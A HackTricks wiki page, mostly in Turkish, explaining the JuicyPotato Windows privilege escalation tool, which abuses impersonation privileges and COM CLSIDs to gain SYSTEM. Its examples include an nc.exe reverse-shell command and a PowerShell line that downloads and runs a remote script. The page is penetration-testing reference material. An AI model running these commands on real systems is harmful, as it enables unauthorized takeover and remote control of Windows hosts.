# JuicyPotato

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarını paylaşın,** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato,** Windows Server 2019 ve Windows 10 build 1809 ve sonrasında **çalışmaz.** Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) ile **aynı ayrıcalıkları kullanarak `NT AUTHORITY\SYSTEM`** düzeyinde erişim elde edebilirsiniz. _**Kontrol Et:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (altın ayrıcalıkları kötüye kullanma) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_**RottenPotatoNG**_ [_sürümünün şekerli bir versiyonu,_](https://github.com/breenmachine/RottenPotatoNG) _biraz meyve suyu ile, yani **Windows Servis Hesaplarından NT AUTHORITY\SYSTEM** düzeyine başka bir Yerel Ayrıcalık Yükseltme aracı._

#### Juicypotato'yu [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) adresinden indirebilirsiniz.

### Özet <a href="#summary" id="summary"></a>

[**Juicy-potato Readme'den**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) ve onun [varyantları](https://github.com/decoder-it/lonelypotato), [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servisine](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) dayanan ayrıcalık yükseltme zincirini kullanır ve `127.0.0.1:6666` üzerinde MiTM dinleyicisi vardır ve `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına sahip olduğunuzda çalışır. Bir Windows build incelemesi sırasında, `BITS`'in kasıtlı olarak devre dışı bırakıldığı ve `6666` portunun alındığı bir kurulum bulduk.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi silahlandırmaya karar verdik: **Juicy Potato'ya merhaba deyin.**

> Teori için, [Rotten Potato - Servis Hesaplarından SYSTEM'e Ayrıcalık Yükseltme](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) sayfasını inceleyin ve bağlantılar ve referanslar zincirini takip edin.

`BITS` dışında, kötüye kullanabileceğimiz birkaç COM sunucusu olduğunu keşfettik. Bunların sadece:

1. mevcut kullanıcı tarafından örneklendirilebilir olması, genellikle taklit ayrıcalıklarına sahip bir "servis kullanıcısı"
2. `IMarshal` arayüzünü uygulaması
3. yükseltilmiş bir kullanıcı (SYSTEM, Administrator, …) olarak çalışması gerekir.

Biraz test yaptıktan sonra, birkaç Windows sürümünde [ilginç CLSID'lerin](http://ohpe.it/juicy-potato/CLSID/) kapsamlı bir listesini elde ettik ve test ettik.

### Juicy detaylar <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato, size şunları sağlar:

* **Hedef CLSID** _istediğiniz herhangi bir CLSID'yi seçin._ [_Burada_](http://ohpe.it/juicy-potato/CLSID/) _işletim sistemine göre düzenlenmiş listeyi bulabilirsiniz._
* **COM Dinleme portu** _tercih ettiğiniz COM dinleme portunu tanımlayın (hardcoded 6666 yerine)_
* **COM Dinleme IP adresi** _sunucuyu herhangi bir IP'ye bağlayın_
* **İşlem oluşturma modu** _taklit edilen kullanıcının ayrıcalıklarına bağlı olarak şunlardan birini seçebilirsiniz:_
* `CreateProcessWithToken` (gerekli `SeImpersonate`)
* `CreateProcessAsUser` (gerekli `SeAssignPrimaryToken`)
* `her ikisi de`
* **Başlatılacak işlem** _sömürü başarılı olursa bir yürütülebilir dosya veya betik başlatın_
* **İşlem Argümanı** _başlatılan işlem argümanlarını özelleştirin_
* **RPC Sunucu adresi** _gizli bir yaklaşım için harici bir RPC sunucusuna kimlik doğrulaması yapabilirsiniz_
* **RPC Sunucu portu** _harici bir sunucuya kimlik doğrulaması yapmak istiyorsanız ve güvenlik duvarı `135` portunu engelliyorsa…_
* **TEST modu** _temelde test amaçlıdır, yani CLSID'leri test etmek için. DCOM oluşturur ve token kullanıcısını yazdırır. _[_test için buraya bakın_](http://ohpe.it/juicy-potato/Test/)

### Kullanım <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Eğer kullanıcının `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıkları varsa, o zaman **SYSTEM**'siniz.

Tüm bu COM Sunucularının kötüye kullanımını önlemek neredeyse imkansızdır. Bu nesnelerin izinlerini `DCOMCNFG` aracılığıyla değiştirmeyi düşünebilirsiniz ama iyi şanslar, bu zorlayıcı olacak.

Gerçek çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak kesinlikle bu istismarı engelleyecektir ancak temel işletim sistemi üzerinde ciddi bir etki yaratabilir.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Examples

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Yeni bir CMD başlatın (eğer RDP erişiminiz varsa)

![](<../../.gitbook/assets/image (300).png>)

## CLSID Problemleri

Çoğu zaman, JuicyPotato'nun kullandığı varsayılan CLSID **çalışmaz** ve exploit başarısız olur. Genellikle, **çalışan bir CLSID** bulmak için birden fazla deneme gerekir. Belirli bir işletim sistemi için denemek üzere CLSID'lerin bir listesini almak için bu sayfayı ziyaret etmelisiniz:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSID'leri Kontrol Etme**

Öncelikle, juicypotato.exe dışında bazı çalıştırılabilir dosyalara ihtiyacınız olacak.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) dosyasını indirin ve PS oturumunuza yükleyin, ardından [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) dosyasını indirin ve çalıştırın. Bu script, test edilecek olası CLSID'lerin bir listesini oluşturacaktır.

Sonra [test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) dosyasını indirin (CLSID listesi ve juicypotato çalıştırılabilir dosyası için yolu değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacaktır ve **port numarası değiştiğinde, bu CLSID'nin çalıştığı anlamına gelecektir**.

**Çalışan** CLSID'leri **-c parametresini kullanarak kontrol edin**

## Referanslar

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
